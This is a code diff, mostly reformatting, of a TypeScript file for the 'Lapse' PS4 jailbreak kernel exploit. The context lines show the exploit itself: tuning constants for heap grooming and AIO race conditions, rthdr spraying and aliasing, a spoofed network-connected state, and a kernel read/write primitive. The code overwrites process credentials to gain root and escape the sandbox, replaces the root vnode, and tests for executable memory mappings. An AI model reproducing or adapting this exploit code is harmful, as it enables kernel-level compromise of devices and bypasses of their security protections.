@@ -28,14 +28,14 @@ const PAGE_SIZE = 0x4000
 const MAIN_CORE = 4
 const MAIN_RTPRIO = 0x100
 const NUM_WORKERS = 4          // was 2   — more AIO blocking workers
-const NUM_GROOMS  = 0x300      // was 0x200 — larger heap groom
+const NUM_GROOMS = 0x300      // was 0x200 — larger heap groom
 const NUM_HANDLES = 0x180      // was 0x100 — more evf handles for better aliasing
-const NUM_SDS     = 96         // was 64   — bigger rthdr spray
+const NUM_SDS = 96         // was 64   — bigger rthdr spray
 const NUM_SDS_ALT = 72         // was 48   — ditto for alt set
-const NUM_RACES   = 200        // was 100  — more AIO race attempts
-const NUM_ALIAS   = 200        // was 100  — more alias search loops
-const LEAK_LEN    = 16
-const NUM_LEAKS   = 64         // was 32   — more leak slots
+const NUM_RACES = 200        // was 100  — more AIO race attempts
+const NUM_ALIAS = 200        // was 100  — more alias search loops
+const LEAK_LEN = 16
+const NUM_LEAKS = 64         // was 32   — more leak slots
 const NUM_CLOBBERS = 16        // was 8    — more clobber attempts
 const MAX_AIO_IDS = 0x100      // was 0x80 — larger AIO id pool
 const MAX_FULL_RESTARTS_LAPSE = 4  // full teardown+reinit cycles
@@ -715,13 +715,13 @@ function make_aliased_rthdrs (sds: BigInt[]): [BigInt, BigInt] | null {
 // disconnect events that can abort the exploit mid-run.
 // Must register ioctl here — lapse does not share fn state with netctrl.
 // ---------------------------------------------------------------------------
-const SIOCGIFFLAGS_LAPSE  = 0xC0206911
-const SIOCSIFFLAGS_LAPSE  = 0x80206910
-const SIOCSIFADDR_LAPSE   = 0x8020690C
-const IFF_UP_LAPSE        = 0x0001
-const IFF_RUNNING_LAPSE   = 0x0040
+const SIOCGIFFLAGS_LAPSE = 0xC0206911
+const SIOCSIFFLAGS_LAPSE = 0x80206910
+const SIOCSIFADDR_LAPSE = 0x8020690C
+const IFF_UP_LAPSE = 0x0001
+const IFF_RUNNING_LAPSE = 0x0040
 const IFF_BROADCAST_LAPSE = 0x0002
-const IFREQ_SIZE_LAPSE    = 32
+const IFREQ_SIZE_LAPSE = 32
 const SOCKADDR_IN_SIZE_LAPSE = 16
 
 function spoof_network_connected_lapse () {
@@ -1929,8 +1929,8 @@ function make_kernel_arw (pktopts_sds: BigInt[], reqs1_addr: BigInt, kernel_addr
 
 export function lapse () {
   // ── Setup visible log screen so user sees progress ────────────────────────
-  const LAPSE_LOG_MAX  = 26
-  const LAPSE_LOG_H    = 32
+  const LAPSE_LOG_MAX = 26
+  const LAPSE_LOG_H = 32
   const lapseLogBuf: string[] = []
   const lapseLogLines: jsmaf.Text[] = []
 
@@ -1941,29 +1941,35 @@ export function lapse () {
 
     const bg = new Image({
       url: 'file:///../download0/img/multiview_bg_VAF.png',
-      x: 0, y: 0, width: 1920, height: 1080
+      x: 0,
+      y: 0,
+      width: 1920,
+      height: 1080
     })
     jsmaf.root.children.push(bg)
 
     const logo = new Image({
       url: 'file:///../download0/img/logo.png',
-      x: 1620, y: 0, width: 300, height: 169
+      x: 1620,
+      y: 0,
+      width: 300,
+      height: 169
     })
     jsmaf.root.children.push(logo)
 
     const titleTxt = new jsmaf.Text()
-    titleTxt.text  = 'Lapse Jailbreak Running'
-    titleTxt.x     = 40
-    titleTxt.y     = 40
+    titleTxt.text = 'Lapse Jailbreak Running'
+    titleTxt.x = 40
+    titleTxt.y = 40
     titleTxt.style = 'lapse_title'
     jsmaf.root.children.push(titleTxt)
 
     for (let i = 0; i < LAPSE_LOG_MAX; i++) {
       const line = new jsmaf.Text()
-      line.text  = ''
+      line.text = ''
       line.style = 'lapse_log'
-      line.x     = 40
-      line.y     = 100 + i * LAPSE_LOG_H
+      line.x = 40
+      line.y = 100 + i * LAPSE_LOG_H
       jsmaf.root.children.push(line)
       lapseLogLines.push(line)
     }
@@ -2123,7 +2129,7 @@ export function lapse () {
       log('[*] BEFORE: uid=' + uid_before + ' sandbox=' + sandbox_before)
 
       const proc_fd = kernel.read_qword(proc.add(kernel_offset.PROC_FD!))!
-      const ucred   = kernel.read_qword(proc.add(OFFSET_P_UCRED))!
+      const ucred = kernel.read_qword(proc.add(OFFSET_P_UCRED))!
 
       kernel.write_dword(ucred.add(0x04), 0)
       kernel.write_dword(ucred.add(0x08), 0)
@@ -2140,7 +2146,7 @@ export function lapse () {
       kernel.write_qword(proc_fd.add(0x10), rootvnode)
       kernel.write_qword(proc_fd.add(0x18), rootvnode)
 
-      const uid_after     = Number(getuid())
+      const uid_after = Number(getuid())
       const sandbox_after = Number(is_in_sandbox())
       log('[*] AFTER:  uid=' + uid_after + ' sandbox=' + sandbox_after)
 
@@ -2172,8 +2178,8 @@ export function lapse () {
         }
 
         try {
-          const PROT_RWX  = 0x7
-          const MAP_ANON  = 0x1000
+          const PROT_RWX = 0x7
+          const MAP_ANON = 0x1000
           const MAP_PRIVATE = 0x2
           const test_addr = mmap(new BigInt(0), 0x1000, PROT_RWX, MAP_PRIVATE | MAP_ANON, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), 0)
           if (Number(test_addr.shr(32)) < 0xffff8000) {
@@ -2199,14 +2205,12 @@ export function lapse () {
       cleanup()
       exit_app(4000)  // auto-exit after 4 seconds
       return true
-
     } // end restart loop
 
     lapseLog('[ERR] All restart attempts exhausted - rebooting PS4...')
     send_notification('[VAF-Lapse] Failed - rebooting...')
     reboot_ps4(6000)
     return false
-
   } catch (e) {
     lapseLog('[ERR] Fatal error: ' + (e as Error).message)
     utils.notify('[VAF-Lapse] Fatal error - rebooting...')
